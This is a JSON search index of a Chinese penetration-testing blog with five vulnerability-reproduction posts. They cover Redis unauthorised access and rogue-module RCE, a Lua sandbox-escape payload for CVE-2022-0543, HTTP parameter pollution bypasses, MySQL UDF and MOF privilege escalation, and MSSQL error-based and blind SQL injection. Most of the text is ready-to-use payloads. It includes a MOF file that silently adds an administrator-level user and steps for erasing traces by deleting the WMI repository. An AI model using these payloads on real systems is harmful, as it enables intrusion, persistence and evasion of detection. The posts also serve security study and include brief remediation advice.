[{"title":"redis 未授权访问 (CNVD-2019-21763)","path":"/2022/09/20/redis 未授权访问 (CNVD-2019-21763)-redis-wei-shou-quan-fang-wen-cnvd-2019-21763/","content":"前言Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载恶意.so 文件，从而实现远程代码执行。 需要下载工具： git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommandgit clone https://github.com/Ridter/redis-rce.git还有一个工具但是复现的时候没有用git clone https://github.com/LoRexxar/redis-rogue-server.git 漏洞影响的产品版本包括：Redis 2.x，3.x，4.x，5.x 参考文章：https://blog.csdn.net/qq_14902381/article/details/126308120https://cloud.tencent.com/developer/article/1627282 漏洞复现一、下载这两个工具12git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommandgit clone https://github.com/Ridter/redis-rce.git 然后进入RedisModules-ExecuteCommand目录， 执行 make，进行编译，得到module.so 文件 二、将module.so这个文件拖入，下载好的redis-rce文件夹。 三、执行命令getshell1python3 redis-rce.py -r xxx.xxx.xxx.xxx -p xxxx -L xxx.xxx.xxx.xxx -P xxxx -f module.so （-r：靶机ip，-p 靶机端口；-L：kali的ip，-P:kali的端口） 四、漏洞修复修复方式 1、禁止外部访问Redis 服务端口； 2、禁止使用root权限启动Redis服务； 3、配置安全组，限制可连接Redis服务器的IP。 建议使用Redis数据库的信息系统运营者进行自查，发现存在漏洞后，按照临时解决方案及时进行修复。","categories":["漏洞复现"]},{"title":"Redis沙盒逃逸(CVE-2022-0543)漏洞复现","path":"/2022/09/20/Redis沙盒逃逸(CVE-2022-0543)漏洞复现-redis-sha-he-tao-yi-cve-2022-0543-lou-dong-fu-xian/","content":"前言redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令 环境搭建：使用的是https://vulfocus.cn/ 里面的redis靶机Linux 操作系统 工具准备： apt-get install redis-server 安装redis-cli工具 影响版本:2.2 &lt;&#x3D; redis &lt; 5.0.132.2 &lt;&#x3D; redis &lt; 6.0.152.2 &lt;&#x3D; redis &lt; 6.2.5 漏洞复现1. 在攻击机中使用 redis 客户端对靶机进行连接这个漏洞需要先未授权进入redis 才可以，现在进入redis的主流两种方法一直是爆破密码，一种是redis的历史漏洞 redis未授权访问 1redis-cli.exe -h 192.168.1.128(靶场ip) -p 6379(端口) redis 弱口令爆破 爆破工具推荐：https://github.com/shack2/SNETCracker 2. 输入恶意 payload这里的 whoami 就是要执行的命令，可以根据自己的需求更换其他命令。这里可以看到whoami已经成功执行 12 eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0image.png 3. 修复建议1、更新至最新版本2、在 Lua 初始化的末尾添加package&#x3D;nil","categories":["漏洞复现"]},{"title":"HPP 参数污染","path":"/2022/09/14/HPP 参数污染-hpp-can-shu-wu-ran/","content":"一、HPP概念HTTP Parameter Pollution即HTTP参数污染，简称HPP。是web容器处理HTTP参数的一种方式。 HTTP 参数污染 (HPP) 是一种 Web 攻击规避技术，允许攻击者通过更改 HTTP 请求以操纵或搜索隐藏信息。这种规避技术基于在具有相同名称的参数的多个实例之间拆分攻击向量。某些环境通过从请求中连接的参数名称的所有实例中获取的值来处理此类请求。 通常，攻击者可以利用 HPP 漏洞有如下几点： 取代现有的硬编码 HTTP 参数。 更改或修改预期&#x2F;正常的应用程序行为。 访问并可能利用未正确控制的变量。 绕过 WAF 规则或输入验证机制 二、HPP实质 观察这两个url ，在HTTP请求中，使用&amp;可以连接不同的参数。如： 1http://192.168.215.129/hpp.php?str=123&amp;str=456 那么此时在取值时只输出最后一个参数，输出则为456。这就是HTTP参数污染。 三、HPP漏洞分类1、服务端HPP在服务器端HPP中，尝试给服务器端发送非预期信息来让服务器端代码返回非预期的结果。 让我们看一个例子，如果银行通过网站接收URL参数发起转账，可能会造成服务器端HPP漏洞。我们观察这个URL： 1https://www.example.com/transferMoney.php?from=Aboy&amp;to=Bgirl&amp;amount=5000 Aboy向Bgirl转账5000，此时我们在后面再添加一个to参数; 1https://www.example.com/transferMoney.php?from=Aboy&amp;to=Bgirl&amp;amount=5000&amp;to=Cboy 如果银行信任它接收到的最后一个to参数，此时就不是Aboy向Bgirl转账5000，而是Aboy向Cboy转账5000。当服务器接收到多个具有相同名称的参数时，它可以通过多种方式去响应。在大多数情况下，PHP 和 Apache取参数的最后一次赋值，Apache Tomcat取参数的第一次赋值，ASP 和 IIS 取参数的所有赋值。 2、客户端HPP客户端HPP漏洞使攻击者可以向URL中注入额外的参数，从而对客户端产生影响(客户端最常见的操作方式是个人电脑，通常是通过浏览器触发，并不是发生在网站的服务器端)。 四、实战案例总结：HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景： 1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞;2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。这里汇总了工作中和国内外遇到的一些典型案例： 一、 逻辑漏洞（IDOR）1、IDOR（不安全的对象引用）一般的社交软件都有“关注”或”喜欢”功能，下面就是ID为5318415对5333003进行关注发送的数据包： 按我们通常挖掘逻辑漏洞的思路，我们可以篡改ID值，使对方关注我。这里5318415是我的ID，但将我的actorId替换为对方的ID，会收到“401 Unauthorized”错误，说明此处做了鉴权操作。 但是，如果请求2个actorId参数，第一个actorId参数是目标的actorId。这样5024700（受害者）会关注5318415（我）。这次得到的响应是202 Accepted。 后台对于actorId的鉴权操作是对第二个，关注操作取的却是第一个。所以在测试越权类问题时未果不妨多试一步HPP，下面Twitter案例也是如出一辙： 1https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26 通过添加第二个uid，取消Twitter的邮箱提醒。 2、 社交分享链接不少网站都有社交分享按钮，可以把内容分享到其他社交媒体，如Hackerone的链接为： 1https://hackerone.com/blog/introducing-signal 分享到FB上链接为： 1https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal 如果我们将要分享的Hackerone的链接改为： 1https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov 则最终的跳转会成为： 1https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov 后一个参数u拥有比第一个更高的优先级，之后会用于 Fackbook 的发布，最终会跳转到恶意站点 1https://vk.com/durov 3、 页面跳转一个Digits跳转的案例，跳转链接如下： 1https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv 如果直接修改参数为http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP： 1https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com 从而第一个host参数绕过验证，取第二个host参数作为跳转源。 二、绕过检测（WAF）1、SQL绕过1一个常见的SQL注入payload如： 1http://xxx/horse.php?id=7 union select 1,2,3，current_user 探测发现网站配置了WAF来阻止任意包含“select”或“union”等常用的SQL查询关键字，通过HPP绕过： 1http://xxx/horse.php?id=0&amp;amp;id=7%20union%20select%201,2,3,current_user 注入语句被写到第二个参数值的位置，不会被waf解析。 2、 SQL绕过2ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单。但是这个web服务器在遇到为同一个参数赋值不同数值时，会采取类似谷歌的处理方式，将参数连接起来，以此来绕过黑名单。 例如提交如下的URL： 1http://xxx/index.aspx?page=select 1&amp;page=2,3 from table 3、Apple Cups的XSSApple Cups是被许多UNIX系统利用的打印系统。系统对kerberos进行了黑名单过滤，通过前置一个重复参数可以触发xss： 1http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos= 这个方法可以绕过系统的验证机制，原因是这个验证系统只采纳了第二个kerberos的值，这个值为空，因此不会触发。而第一个kerberos直到被用于构建动态HTML内容前都没有被验证。最终在web站点的上下文中javascript语句被执行。 4、URL重定向+HPP+XSS在点击网站的链接时，会将用户重定向到一个页面，链接为： 1xxx.aspx?dest=http://whitelistedWebsite.com 这容易想到URL重定向漏洞，经过探测，发现dest参数接受的协议有http:&#x2F;&#x2F; ftp:&#x2F;&#x2F; http:&#x2F; javascript:&#x2F;，所以尝试构造xss： 1dest=javascript://alert(document.domain) 发现存在白名单限制，尝试绕过： 1dest=javascript:/whitelistedWebsite.com/i;alert(document.domain 但分号；会无法解析，导致报错，最终使用HPP绕过： 1dest=javascript:/whitelistedWebsite.com/i&amp;dest=alert(1) 原理和例1类似，接受两个参数值进行拼接：javascript:&#x2F;&#x2F;alert(1) 五、挖掘技巧：根据上面的实战案例总结，在挖掘HPP漏洞的时候，需要注意以下几点：1、和IDOR漏洞挖掘类似，关注与用户权限紧密相关的参数，有些场景可能防范了IDOR，但重复提交参数可能就会产生奇效；2、在挖掘其他漏洞的时候，如果进行了检测又无法绕过的情况下，可以尝试通过重复提交参数&#x2F;参数拼接方式绕过检测。 六、预防为了防止这些类型的漏洞，应该执行广泛和适当的输入验证。有符合每种网络技术&#x2F;语言的安全方法。此外，应该提高对客户&#x2F;用户可以提供多个参数这一事实的认识。","categories":["other"]},{"title":"Mysql的Udf Mof 提权","path":"/2022/09/14/Mysql的Udf Mof 提权-mysql的udfmof提权/","content":"Udf提权前言1、什么是udf udf &#x3D; “user defined function”,即‘用户自定义函数’。是通过添加新函数，对MYSQL的功能进行扩充，性质就像使用本地MYSQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于’mysql&#x2F;lib&#x2F;plugin’目录下，文件后缀为’.dll’ 2、实验环境 123win7 x64 phpstudy 2018 mysql 5.1.60 3、利用条件 知道数据库的用户和密码； mysql可以远程登录； mysql有写入文件的权限，即secure_file_priv的值为空。 一、查看是否有可写权限: 在MySQL5.5、5.6、5.7版本：my.ini中无此参数，查询该参数情况为NULL 查看secure_file_priv是否开启 1show global variables like &#x27;%secure%&#x27; 因为状态为NULL,我们需要修改my.ini，开启secure_file_priv，打开my.ini，查找secure_file_priv。 存在，修改为secure_file_priv&#x3D;”” 不存在，则在[mysqld]下，新增secure_file_priv&#x3D;””修改之后，重启数据库再次查看，成功开启 二、查看系统版本，和安装目录，添加合适的udf.dll查看系统版本 1show variables like &#x27;%compile%&#x27;; 查看mysql目录 1select @@basedir; 三、如何添加 udf.dlludf.dll 在sqlmap里面对应的目录地址为 \\sqlmap\\data\\udf\\mysql,不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。这里如果后缀名为.so_ (linux)或dll_(windows)的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。这里sqlmap也自带了解码的py脚本，在&#x2F;extra&#x2F;cloak目录下，使用cloak.py解密即可。 1python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll Mysql版本大于5.1:udf.dll文件必须放在MySQL安装目录的lib\\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。没找到创建的方法，直接新建了目录 Mysql版本小于5.1：如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\\Winnt\\udf.dll 下。如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\\Windows\\udf.dll 下。 这里，通过如下命令将dll文件写入到plugin中 12select hex(load_file(&#x27;C:\\\\Users\\\\hp\\\\Desktopl\\\\lib_mysqludf_sys.dll&#x27;)) into dumpfile &#x27;C:\\\\phpStudy\\\\phpstudy_pro\\\\Extensions\\\\MySQL5.7.26\\\\lib\\plugin\\\\udf.dll&#x27;;#这里windows下目录结构要进行转义双写 四、 创建自定义函数上传之后，使用如下命令创建自定义函数，在这里发现在Mysql5.7.26没办法创建自定义函数，然后把Mysql改成了5.1.60，然后就执行成 1CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;; 使用命令查看是否新增了sys_eval函数 1select * from mysql.func; 执行系统命令 1select sys_eval(&#x27;whoami&#x27;); 如果出现以下两种报错，可能是因为使用 lib_mysqludf_sys_64.dll 失败了，使用 lib_mysqludf_sys_32.dll 就会成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的。 五、删除自定义函数1drop function sys_eval; 六、总结UDF提权其实限制条件挺多的，它似乎不能让你提升权限，只是让你在mysql中执行系统命令。限制条件如下● Mysql版本大于5.1，我们需手动创建plugin文件夹，这是个棘手的问题● mysql有写入文件的权限，即secure_file_priv的值为空● mysql先要进行远程登录 MOF 提权前言在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将想要的操作通过代码存储到这个mof文件中，就可以实现权限提升。 利用条件： 仅限windows 及适用于windows server2003及以下的版本 mysql用户具有root权限(对上面那个目录可写） 关闭了secure-file-priv 公开的nullevt.mof利用代码12345678910111213141516171819202122#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;)instance of __EventFilter as $EventFilter&#123;EventNamespace = &quot;Root\\\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123;Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;) WSH.run(\\&quot;net.exe user hpdoger 123456 /add\\&quot;)&quot;;&#125;;instance of __FilterToConsumerBinding&#123;Consumer = $Consumer;Filter = $EventFilter;&#125;; MOF文件利用将上面的脚本上传到有读写权限的目录下：这里我上传到了C:\\Documents and Settings\\test根据前面的phpmyadmin，我们使用sql语句将文件导入到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;下。 payload: 1select load_file(&#x27;mof提权文件及路径&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27; 值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。 清除痕迹因为每隔一段时间时间，mof文件会被再次执行以致重新添加用户，所以想要清理痕迹得先暂时关闭 winmgmt服务再删除相关mof文件，这个时候在删除用户才会有效果操作命令如下（已检验可以使用）：停止 winmgmt 服务 1net stop winmgmt 删除 Repository 文件夹 1rmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\ 手动删除 mof 文件 1del C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /S 删除创建的用户 1net user hacker /del 重新启动服务 1net start winmgmt","categories":["sql"]},{"title":"MSSQL 盲注和报错注入基础","path":"/2022/06/04/MSSQL 盲注和报错注入基础-hello-mssql/","content":"Mssql 盲注和报错注入Mssql 的基本库 sysaltfiles：主数据库 保存数据库的文件syscharsets：主数据库字符集与排序顺序sysconfigures：主数据库 配置选项syscurconfigs：主数据库当前配置选项sysdatabases：主数据库服务器中的数据库sslanguages：主数据库语言syslogins：主数据库 登陆帐号信息sysoledbusers：主数据库 链接服务器登陆信息sysprocesses：主数据库进程sysremotelogins主数据库 远程登录帐号syscolumns：每个数据库 列sysconstrains：每个数据库 限制sysfilegroups：每个数据库 文件组sysfiles：每个数据库 文件sysforeignkeys：每个数据库 外部关键字sysindexs：每个数据库 索引sysmenbers：每个数据库角色成员sysobjects：每个数据库所有数据库对象syscomments：数据库对象的详细资料syspermissio ns：每个数据库 权限systypes：每个数据库 用户定义数据类型sysusers：每个数据库 用户sys.tables ： 所有数据表 在着其中：sys.databases这张表中储存了SQLServer中所有的数据库的库名；sys.objects表中储存了SQLServer中所有的数据库的表名；sys.columns表中储存了SQLServer中所有的数据表的列名。 sql server 主要函数host_name() :返回服务器端主机名称。current_user()：返回当前数据库用户。db_name():返回当前数据库库名 。char():将ASCII码转化为对应的字符。ASCII():将字符转化为对应的ASCII码。substring():截取字符串。 Mssql 中用户权限 MSSQL 报错注入常用报错函数介绍convert()函数介绍：定义： convert() 函数是把日期转换为新数据类型的通用函数。用法： 对于 convert(int,@@version)，convert 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，⽆法进⾏指定的转换，所以，convert函数会抛出 ⼀个SQL server错误消息，指出“SQL查询结果”⽆法转换为“int”类型，这样的话，攻击者就能得到的这个SQL查询的结果了 quotename()函数介绍：定义： quotename() 函数默认在要处理的参数左右加上两个中括号，起到分隔符的作用，避免出现sql关键字异常。用法： quotename(name)，给查询出的多个表名、列名加入中括号，或者其他符号为分隔符，进行分割，可使SQL注入结果更清晰。 for xml path(’’)语句介绍：定义： 提供查询返回的结果为xml格式，此时返回的相当于一个字符串。用法： 将查询到的数据，通过xml进行显示，path指定xml元素结点（行节点），该语句可以将查询到的所有数据通过XML进行显示。 stuff()函数介绍：定义： stuff()函数将表中列的内容横向输出。用法： stuff(param1, startIndex, length, param2)，将param1中自startIndex(SQL中都是从1开始，而非0)起，删除length个字符，然后用param2替换删掉的字符 基本注入流程基本测试函数 convert(int,@@version) 获取版本信息convert(int,db_name()) 数据库名字convert(int,user) 当前⽤户名convert(int,@@SERVERNAME) 获取有关服务器主机的信息 判断数据库数量 CONVERT(int,(select name from master.dbo.sysdatabases where dbid&gt;4))&#x2F;&#x2F;查询所有数据库，Mssql中系统表中基本表，前四个是系统表，第五个开始为用户表。 当下数据库中的数据表 CONVERT(int,(select top 1 table_name from information_schema.columns))&#x2F;&#x2F;查询当前数据下的第一个数据表，top 1表示只显示查询的第一个结果。 查询数据表中的字段 convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;’stuinfo’)) convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;cast(0x737475696E666F as varchar)))&#x2F;&#x2F; 这个查询列，需要将表名16进制，网址http://www.txttool.com/t/?id=NDgy convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME&#x3D;cast(0x737475696E666F as varchar) and COLUMN_NAME !&#x3D; ‘sid’)))&#x2F;&#x2F; 在查询到第一个字段的时候，可以通过这个方法去查询第二个字段 查询数据表中的数据 convert(int,(select top 1 sid from stuinfo)) &#x2F;&#x2F;基本语句，列名就说字段名 这里由于sid的类型为int，并未报错 convert(int,(select top 1 列名 from 表名 where 列名!&#x3D;’saul’)) &#x2F;&#x2F;同样的方法，去继续查询 MSSQL 注入盲注(布尔)一般在无回显的情况下去进行盲注，注入语句都不能单独使用，要与前面一个可执行的语句衔接 注释：count(*)返回行数 先查看第一个用户表是否存在（dbid&#x3D;5），然后一直往后查询 and (select count(*) from master.dbo.sysdatabases where dbid&#x3D;5)&#x3D;1&#x2F;&#x2F;sysdatabases：主数据库服务器中的数据库，前四个为系统表从第五个开始为用户表 在用户表存在的情况下，就可以开始盲注了,首先判断数据库的长度 and (select count(*) from master.dbo.sysdatabases where dbid&#x3D;5 and len(name)&#x3D;4)&#x3D;1 猜解数据库注释：substring(str,start,len) 截取字符串的作用，第一个参数为要截取的字符串，第二个参数为从哪里开始截取，第三个参数为截取的长度。ascii(char) 把字符转换为ascii值，因为我们dbid5的数据库名是Sales，他的第一个字符S是ASCII码为83，我们就可以使用下面的语句来判断： and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid &gt; 4),1,1)) &#x3D; 83and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid&#x3D;5),1,1)) &#x3D; 83&#x2F;&#x2F;后面只需要递增substring的第二个参数就可以，猜解数据库名字 猜解当前数据库中的数据表的长度注释：where后面这个查询语句，是查询students数据库下的第一个表，将表名赋值给name and(select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and len(name)&#x3D;7) 猜解数据库中数据表 and (select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1 and ascii(substring((select top 1 name from students..sysobjects where xtype&#x3D;’U’ and name in (select top 1 name from students.sys.sysobjects where xtype&#x3D;’U’)),1,1))&#x3D;115 猜测数据表中的列 and ascii(substring((select top 1 name from syscolumns where id&#x3D;(select id from sysobjects where xtype&#x3D;0x75 and name&#x3D;’stuinfo’)),1,1)) &#x3D;115 查询列中的数据and ascii(substring((select top 1 sid from stuinfo),1,1)) &#x3D;115 MSSQL 注入盲注(延时)延时函数 WAITFOR DELAY WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。 如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断⽹站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。 语法：WAITFOR DELAY ‘0:0:n’常见注入语法：IF exists() WAITFOR DELAY ‘0:0:5’ 猜测数据库长度 if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;5)&#x3D;1) waitfor delay ‘0:0:3’–&#x2F;&#x2F;判断用户数据库是否存在 if ((select count(*) from master.dbo.sysdatabases where dbid&#x3D;5 and len(name)&#x3D;4)&#x3D;1) waitfor delay ‘0:0:3’–&#x2F;&#x2F;判断数据库长度 根据dbid查询挨个查询数据库名 if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid&#x3D;5),1,1)) &#x3D; 115) WAITFOR DELAY ‘0:0:3’– 猜解表名 if ( (select count(*) from students.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype&#x3D;’u’) and len(name)&#x3D;5)&#x3D;1) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;猜解数据表长度 if ((select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;猜解表名 if ((select count(*) from students.dbo.sysobjects where name in (select top 1 name from students.dbo.sysobjects where xtype&#x3D;’u’ and name not in (‘stuinfo’)) and ascii(substring(name,1,1))&#x3D;115)&#x3D;1) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;使用not语句，去猜解第二个表的名字 猜解列名 if (exists(select top 1 name from syscolumns where id &#x3D;(select id from sysobjects where name &#x3D; ‘users’) and unicode(substring(name,1,1))&#x3D;115)) WAITFOR DELAY ‘0:0:3’–、&#x2F;&#x2F;方法一 if (ascii(substring((select top 1 name from syscolumns where id&#x3D;(select id from sysobjects where xtype&#x3D;0x75 and name&#x3D;’users’)),1,1)) &#x3D;115) WAITFOR DELAY ‘0:0:3’–&#x2F;&#x2F;方法二，0x75就是u 在知道表名何列名的情况下，去爆数据 if (ascii(substring((select top 1 sid from stuinfo),1,1)) &#x3D; 115) WAITFOR DELAY ‘0:0:3’–","categories":["sql"]}]